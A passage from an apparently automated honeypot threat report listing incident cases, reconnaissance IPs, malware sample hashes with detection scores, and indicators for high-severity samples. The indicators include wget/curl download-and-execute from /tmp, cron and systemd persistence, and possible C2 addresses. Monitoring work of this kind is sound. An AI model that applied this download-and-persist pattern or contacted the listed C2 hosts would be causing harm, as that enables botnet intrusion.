| IR-2b0eb3f5292a | HIGH | `60.54.59[.]152` | 2026-10-17 09:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f6e77327e782 | HIGH | `60.54.59[.]152` | 2026-10-17 09:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-54def133edac | HIGH | `45.78.201[.]248` | 2026-10-17 10:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1a1214658d67 | HIGH | `45.78.201[.]248` | 2026-10-17 10:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7a39177bcb62 | HIGH | `125.31.2[.]160` | 2026-10-17 10:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-29e83a5fc79e | HIGH | `125.31.2[.]160` | 2026-10-17 10:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0e5edd7e2ffa | HIGH | `109.160.32[.]159` | 2026-10-17 10:18 | Y | 1 | 0 | `T1078 · T1592` |
| IR-6637fa6020ac | HIGH | `123.6.229[.]172` | 2026-10-17 10:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-65173c241cee | HIGH | `123.6.229[.]172` | 2026-10-17 10:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-40cf0937e4fd | HIGH | `70.34.202[.]108` | 2026-10-17 10:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b55214196ed0 | HIGH | `196.189.155[.]89` | 2026-10-17 10:41 | Y | 20 | 1 | `T1021.004 · T1053.003 · T1057` |
| IR-ae28385c17b1 | HIGH | `165.232.179[.]1` | 2026-10-17 10:46 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3694f3f126c5 | HIGH | `165.232.179[.]1` | 2026-10-17 10:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c4af54afe1b1 | HIGH | `109.160.32[.]147` | 2026-10-17 10:49 | Y | 1 | 0 | `T1078 · T1592` |
| IR-90059768ac64 | HIGH | `176.53.159[.]196` | 2026-10-17 10:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d790144a8bdd | HIGH | `157.10.186[.]28` | 2026-10-17 10:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-378051eceb44 | HIGH | `130.12.180[.]51` | 2026-10-17 10:56 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-831737d8f384 | HIGH | `167.172.102[.]218` | 2026-10-17 11:00 | Y | 0 | 0 | `T1078` |
| IR-016894a84a82 | HIGH | `167.172.102[.]218` | 2026-10-17 11:01 | Y | 8 | 0 | `T1078` |
| IR-33594c166993 | HIGH | `164.92.226[.]61` | 2026-10-17 11:01 | Y | 3 | 0 | `T1078` |
| IR-ab4c590342c6 | HIGH | `109.160.32[.]109` | 2026-10-17 11:11 | Y | 1 | 0 | `T1078 · T1592` |
| IR-413c8f05c284 | HIGH | `187.216.224[.]85` | 2026-10-17 11:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-dc58a222ce5e | HIGH | `187.216.224[.]85` | 2026-10-17 11:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-94f382089975 | HIGH | `182.43.76[.]81` | 2026-10-17 11:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3a096e4aa876 | HIGH | `182.43.76[.]81` | 2026-10-17 11:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3d1435296733 | HIGH | `129.121.143[.]150` | 2026-10-17 11:19 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-47fb2d0ec643 | HIGH | `129.121.143[.]150` | 2026-10-17 11:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f5e1ee6e2e2b | HIGH | `124.156.176[.]22` | 2026-10-17 11:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0893f49e7299 | HIGH | `144.22.238[.]238` | 2026-10-17 11:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-65762514d764 | HIGH | `176.53.159[.]196` | 2026-10-17 12:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fbb4fb385c48 | HIGH | `202.107.164[.]66` | 2026-10-17 12:22 | Y | 1 | 0 | `T1078 · T1592` |
_… 1 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **2** | 2026-10-17 01:08 | 2026-10-17 02:00 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-17 08:15 | 2026-10-17 10:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `70.34.202[.]108` | **2** | 2026-10-17 06:53 | 2026-10-17 08:28 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]14` | **2** | 2026-10-17 03:58 | 2026-10-17 04:05 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.0.29[.]219` | 1 | 2026-10-17 01:06 | 2026-10-17 01:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.75.222[.]86` | 1 | 2026-10-17 01:17 | 2026-10-17 01:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]106` | 1 | 2026-10-17 08:23 | 2026-10-17 08:23 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]109` | 1 | 2026-10-17 11:10 | 2026-10-17 11:10 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]110` | 1 | 2026-10-17 06:20 | 2026-10-17 06:20 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]141` | 1 | 2026-10-17 04:22 | 2026-10-17 04:22 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]147` | 1 | 2026-10-17 10:48 | 2026-10-17 10:48 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]159` | 1 | 2026-10-17 10:17 | 2026-10-17 10:17 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]31` | 1 | 2026-10-17 02:52 | 2026-10-17 02:52 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]49` | 1 | 2026-10-17 07:08 | 2026-10-17 07:08 | 8s | 0 | `T1592` | 🟢 LOW |
| `111.33.77[.]210` | 1 | 2026-10-17 04:51 | 2026-10-17 04:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.23[.]138` | 1 | 2026-10-17 09:11 | 2026-10-17 09:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.111[.]55` | 1 | 2026-10-17 05:19 | 2026-10-17 05:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.242[.]91` | 1 | 2026-10-17 08:33 | 2026-10-17 08:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.96.158[.]87` | 1 | 2026-10-17 01:24 | 2026-10-17 01:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.17[.]39` | 1 | 2026-10-17 01:06 | 2026-10-17 01:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.39[.]220` | 1 | 2026-10-17 09:34 | 2026-10-17 09:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `128.201.52[.]104` | 1 | 2026-10-17 12:32 | 2026-10-17 12:33 | 13s | 0 | `T1592` | 🟢 LOW |
| `13.218.73[.]191` | 1 | 2026-10-17 01:32 | 2026-10-17 01:32 | 2s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-17 04:37 | 2026-10-17 04:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-17 09:25 | 2026-10-17 09:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-17 12:45 | 2026-10-17 12:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-17 02:47 | 2026-10-17 02:48 | 52s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-17 07:44 | 2026-10-17 07:45 | 53s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-17 11:48 | 2026-10-17 11:49 | 41s | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | 1 | 2026-10-17 10:47 | 2026-10-17 10:48 | 38s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-17 04:03 | 2026-10-17 04:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-17 06:07 | 2026-10-17 06:07 | 1s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-17 12:08 | 2026-10-17 12:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]197` | 1 | 2026-10-17 07:17 | 2026-10-17 07:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.86[.]183` | 1 | 2026-10-17 01:08 | 2026-10-17 01:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `146.148.14[.]215` | 1 | 2026-10-17 09:01 | 2026-10-17 09:02 | 20s | 0 | `T1592` | 🟢 LOW |
| `163.192.127[.]54` | 1 | 2026-10-17 12:27 | 2026-10-17 12:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `164.92.226[.]61` | 1 | 2026-10-17 11:01 | 2026-10-17 11:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `167.172.102[.]218` | 1 | 2026-10-17 11:00 | 2026-10-17 11:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.231.237[.]214` | 1 | 2026-10-17 05:40 | 2026-10-17 05:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]111` | 1 | 2026-10-17 07:09 | 2026-10-17 07:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]208` | 1 | 2026-10-17 06:40 | 2026-10-17 06:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.11.73[.]76` | 1 | 2026-10-17 08:32 | 2026-10-17 08:32 | 12s | 0 | `T1592` | 🟢 LOW |
| `18.116.101[.]220` | 1 | 2026-10-17 04:19 | 2026-10-17 04:19 | 9s | 0 | `T1592` | 🟢 LOW |
| `181.174.228[.]57` | 1 | 2026-10-17 02:58 | 2026-10-17 02:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.226.197[.]28` | 1 | 2026-10-17 08:25 | 2026-10-17 08:25 | 7s | 0 | `T1592` | 🟢 LOW |
| `190.163.219[.]4` | 1 | 2026-10-17 01:01 | 2026-10-17 01:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-17 01:01 | 2026-10-17 01:01 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-17 04:09 | 2026-10-17 04:09 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-10-17 01:04 | 2026-10-17 01:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.50.235[.]157` | 1 | 2026-10-17 08:08 | 2026-10-17 08:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.14.93[.]206` | 1 | 2026-10-17 10:37 | 2026-10-17 10:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.80.109[.]52` | 1 | 2026-10-17 05:29 | 2026-10-17 05:29 | 9s | 0 | `T1592` | 🟢 LOW |
| `202.107.164[.]66` | 1 | 2026-10-17 12:22 | 2026-10-17 12:22 | 1s | 0 | `T1592` | 🟢 LOW |
| `207.175.236[.]246` | 1 | 2026-10-17 02:38 | 2026-10-17 02:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `209.38.204[.]173` | 1 | 2026-10-17 11:01 | 2026-10-17 11:01 | 20s | 0 | `T1592` | 🟢 LOW |
| `209.38.245[.]37` | 1 | 2026-10-17 11:01 | 2026-10-17 11:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `212.3.155[.]8` | 1 | 2026-10-17 07:17 | 2026-10-17 07:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `216.218.206[.]66` | 1 | 2026-10-17 09:14 | 2026-10-17 09:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.0.63[.]25` | 1 | 2026-10-17 01:29 | 2026-10-17 01:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.78.21[.]134` | 1 | 2026-10-17 11:23 | 2026-10-17 11:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `219.150.93[.]157` | 1 | 2026-10-17 09:31 | 2026-10-17 09:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.77.37[.]205` | 1 | 2026-10-17 03:47 | 2026-10-17 03:48 | 18s | 0 | `T1592` | 🟢 LOW |
| `31.14.32[.]4` | 1 | 2026-10-17 01:34 | 2026-10-17 01:34 | 2s | 0 | `T1592` | 🟢 LOW |
| `34.140.136[.]182` | 1 | 2026-10-17 09:15 | 2026-10-17 09:15 | 7s | 0 | `T1592` | 🟢 LOW |
| `34.62.153[.]93` | 1 | 2026-10-17 02:32 | 2026-10-17 02:32 | 4s | 0 | `T1592` | 🟢 LOW |
| `34.79.143[.]194` | 1 | 2026-10-17 09:37 | 2026-10-17 09:37 | 3s | 0 | `T1592` | 🟢 LOW |
| `40.119.45[.]59` | 1 | 2026-10-17 12:44 | 2026-10-17 12:44 | 10s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-10-17 04:02 | 2026-10-17 04:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.177.147[.]65` | 1 | 2026-10-17 12:39 | 2026-10-17 12:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.90[.]118` | 1 | 2026-10-17 08:32 | 2026-10-17 08:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-10-17 01:42 | 2026-10-17 01:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]181` | 1 | 2026-10-17 08:37 | 2026-10-17 08:37 | 3s | 0 | `T1592` | 🟢 LOW |
| `46.150.69[.]59` | 1 | 2026-10-17 12:06 | 2026-10-17 12:06 | 13s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-17 10:49 | 2026-10-17 10:49 | 1s | 0 | `T1592` | 🟢 LOW |
| `58.220.10[.]131` | 1 | 2026-10-17 01:29 | 2026-10-17 01:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]253` | 1 | 2026-10-17 10:04 | 2026-10-17 10:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.205.72[.]128` | 1 | 2026-10-17 08:08 | 2026-10-17 08:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.226.108[.]194` | 1 | 2026-10-17 11:01 | 2026-10-17 11:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]132` | 1 | 2026-10-17 06:39 | 2026-10-17 06:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-10-17 01:17 | 2026-10-17 01:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.92.91[.]63` | 1 | 2026-10-17 07:24 | 2026-10-17 07:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]179` | 1 | 2026-10-17 06:53 | 2026-10-17 06:53 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]196` | 1 | 2026-10-17 06:00 | 2026-10-17 06:00 | 3s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]187` | 1 | 2026-10-17 06:53 | 2026-10-17 06:53 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]101` | 1 | 2026-10-17 06:52 | 2026-10-17 06:53 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]161` | 1 | 2026-10-17 04:17 | 2026-10-17 04:17 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]53` | 1 | 2026-10-17 04:37 | 2026-10-17 04:37 | 14s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]96` | 1 | 2026-10-17 11:00 | 2026-10-17 11:00 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]79` | 1 | 2026-10-17 02:51 | 2026-10-17 02:51 | 4s | 0 | `T1592` | 🟢 LOW |
| `70.34.202[.]108` | 1 | 2026-10-17 10:35 | 2026-10-17 10:35 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `71.105.180[.]137` | 1 | 2026-10-17 03:34 | 2026-10-17 03:35 | 13s | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]130` | 1 | 2026-10-17 07:01 | 2026-10-17 07:01 | 1s | 0 | `T1592` | 🟢 LOW |
| `72.89.39[.]178` | 1 | 2026-10-17 10:19 | 2026-10-17 10:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-17 06:19 | 2026-10-17 06:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-17 09:52 | 2026-10-17 09:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-10-17 03:58 | 2026-10-17 03:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `8.216.3[.]89` | 1 | 2026-10-17 08:42 | 2026-10-17 08:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]55` | 1 | 2026-10-17 01:11 | 2026-10-17 01:11 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `82.215.80[.]207` | 1 | 2026-10-17 12:03 | 2026-10-17 12:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]17` | 1 | 2026-10-17 01:35 | 2026-10-17 01:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]64` | 1 | 2026-10-17 03:40 | 2026-10-17 03:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.242.55[.]3` | 1 | 2026-10-17 07:43 | 2026-10-17 07:43 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
